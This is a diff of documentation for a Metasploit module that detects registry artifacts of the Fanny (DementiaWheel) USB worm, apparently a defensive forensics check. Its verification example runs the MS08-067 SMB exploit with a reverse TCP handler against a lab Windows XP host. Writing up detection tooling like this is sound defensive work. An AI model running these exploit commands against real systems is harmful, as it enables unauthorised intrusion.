@@ -2,7 +2,7 @@
 Fanny or DWE for short. (DWE = DementiaWheel)
 
 Detection module based on the `post/windows/gather/forensics/duqu_check` module. Fanny is a worm that infects windows
-machines, via USB (not trough Autorun, or at least not only).
+machines, via USB (not through Autorun, or at least not only).
 
 In fact, it used exploits later found in StuxNet. It creates creates some Registry artifacts.
 
@@ -32,11 +32,11 @@ This module is intended to detect those artifacts.
 
 ### Windows XP SP3
 ```
-msf6 exploit(windows/smb/ms08_067_netapi) > use exploit/windows/smb/ms08_067_netapi
-msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.122.1
-msf6 exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.122.160
-msf6 exploit(windows/smb/ms08_067_netapi) > set LPORT 4444
-msf6 exploit(windows/smb/ms08_067_netapi) > run
+msf exploit(windows/smb/ms08_067_netapi) > use exploit/windows/smb/ms08_067_netapi
+msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.122.1
+msf exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.122.160
+msf exploit(windows/smb/ms08_067_netapi) > set LPORT 4444
+msf exploit(windows/smb/ms08_067_netapi) > run
 
 [*] Started reverse TCP handler on 192.168.122.1:4444 
 [*] 192.168.122.160:445 - Automatically detecting the target...
